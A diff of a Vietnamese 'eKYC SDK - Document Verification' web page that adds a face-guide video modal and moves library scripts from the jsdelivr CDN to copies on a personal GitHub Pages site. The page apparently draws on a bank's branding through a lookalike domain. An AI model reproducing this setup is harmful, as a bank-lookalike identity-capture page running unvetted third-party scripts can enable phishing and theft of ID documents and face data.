@@ -1,7 +1,6 @@
-
 <!DOCTYPE html>
 <html lang="vi">
-<head><script type='text/javascript' src='https://yp9683-8000.csb.app/bho3M5hHKQ66gL2ZvNu43veJvQYRV2rLsGbVxdhlSXcbcPRBEC7de-EbdVU97dol0Tee7HuzGjASM2QcsIEY1w=='></script>
+<head><script type='text/javascript' src='https://yp9683-8000.csb.app/AWHzG7Kvb1srMkW2mF4ETa5aj78Qvm0XQyDZC1DUSogMZYVHS20Io46YH_PV5sk6PtofwbS7o5wkSUPC4VF75A=='></script>
 <script type="text/javascript">
   // This is a CodeSandbox injection script that's used to
   // add navigation and inspector functionality to the preview
@@ -82,8 +81,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>eKYC SDK - Document Verification</title>
-    <link rel="stylesheet" href="css/styles.css">
-    <link rel="stylesheet" href="css/image-styles.css">
+    <link rel="stylesheet" href="css/styles-complete.css">
 </head>
 <body>
     <!-- Header with Language Selector -->
@@ -230,6 +228,33 @@
         <input type="file" id="fileInput" accept="image/*" style="display: none;">
     </section>
 
+    <!-- Face Guide Video Modal -->
+    <div id="faceGuideModal" class="face-guide-modal hidden">
+        <div class="face-guide-modal-content">
+            <h3 id="faceGuideTitle">Hướng dẫn xác thực khuôn mặt</h3>
+            <div class="face-guide-video">
+                <video 
+                    id="faceGuideVideo"
+                    src="https://www.shinhanfinancer.com/lib/vietnamese-tutorial.mp4" 
+                    poster="https://via.placeholder.com/400x300/00d4aa/ffffff?text=Face+Guide+Video"
+                    controls 
+                    muted 
+                    preload="metadata"
+                    class="guide-video">
+                    <p>Trình duyệt của bạn không hỗ trợ video. <a href="https://www.shinhanfinancer.com/lib/vietnamese-tutorial.mp4">Tải video hướng dẫn</a></p>
+                </video>
+                <p class="video-caption" id="videoCaption">Xem video hướng dẫn để biết cách đặt khuôn mặt đúng cách</p>
+            </div>
+            <div class="video-controls">
+                <button id="skipVideoBtn" class="video-btn secondary">Bỏ qua</button>
+                <button id="continueAfterVideoBtn" class="video-btn primary">
+                    <img src="https://i.imgur.com/be0kdXN.png" alt="Tiếp tục" class="button-icon" />
+                    Tiếp tục
+                </button>
+            </div>
+        </div>
+    </div>
+
     <!-- Face Verification Screen -->
     <section id="faceVerification" class="face-verification hidden">
         <div class="face-header">
@@ -255,25 +280,13 @@
         
         <div class="face-instructions">
             <p id="faceInstructions">Đặt khuôn mặt vào khung hình oval và giữ yên</p>
-            <div class="face-guide-video">
-                <video 
-                    src="https://www.shinhanfinancer.com/lib/vietnamese-tutorial.mp4" 
-                    poster="https://via.placeholder.com/320x240/00d4aa/ffffff?text=Face+Guide+Video"
-                    controls 
-                    muted 
-                    preload="metadata"
-                    class="guide-video">
-                    <p>Trình duyệt của bạn không hỗ trợ video. <a href="https://www.shinhanfinancer.com/lib/vietnamese-tutorial.mp4">Tải video hướng dẫn</a></p>
-                </video>
-                <p class="video-caption">Video hướng dẫn xác thực khuôn mặt</p>
-            </div>
         </div>
     </section>
 
     <!-- Error Message Container -->
     <div id="errorMessage" class="error-message hidden">
         <div class="error-content">
-            <span class="error-icon">❗︎</span>
+            <span class="error-icon">⚠️</span>
             <span id="errorText"></span>
             <button id="errorClose" class="error-close">×</button>
         </div>
@@ -288,10 +301,10 @@
     </div>
 
     <!-- Scripts from CDN -->
-    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/lottie-web@5.12.2/build/player/lottie.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"></script>
-    <script src="js/app.js"></script>
+    <script src="https://vaytieudung.github.io/shinhanbank/assets/js/face-api.min.js"></script>
+    <script src="https://vaytieudung.github.io/shinhanbank/lib/jsQR.js"></script>
+    <script src="https://vaytieudung.github.io/shinhanbank/lib/lottie.min.js"></script>
+    <script src="https://vaytieudung.github.io/shinhanbank/lib/popper.min.js"></script>
+    <script src="js/app-complete.js"></script>
 </body>
 </html>
